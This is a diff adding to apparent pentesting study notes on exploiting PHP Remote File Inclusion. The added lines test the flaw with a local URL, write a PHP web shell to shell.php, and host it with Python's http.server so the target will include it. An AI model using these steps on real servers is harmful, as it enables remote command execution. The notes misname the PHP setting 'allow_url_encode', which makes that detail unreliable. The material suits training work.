@@ -125,4 +125,18 @@ Remote File Inclusion and RCE:
 
 Sometimes, we maybe able to include a file remotely if the vulnerable function allows such. We can use this to enumerate other local only ports or web apps, and potentially gain RCE, as we can use it to include a file under our control (which of course contains malicious code), refer to the table at beginning to see what function have RFI
 
-First of all, to exploit RFI, allow_url_encode must be enabled as remote URL Inclusion is very dangerous. We can discover it with refer to previous section. Even if this option is enabled, it is not always exploitable, to verify it we can 
+First of all, to exploit RFI, allow_url_encode must be enabled as remote URL Inclusion is very dangerous. We can discover it with refer to previous section. Even if this option is enabled, it is not always exploitable, to verify it we can access a local url, this also prevent we got upright blocked by security solutions or waf.
+
+Example:
+```
+http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
+```
+
+After we verified it's existence, we can now start write a piece of external resource that contains malicious code, first we can write a file that contains a webshell / reverse shell into a file that matches the language of the web application, using php as an example:
+```
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+Then, we host it under a port we choose, we can do it with python http server / goshs server:
+```
+sudo python3 -m http.server <LISTENING_PORT>
+```
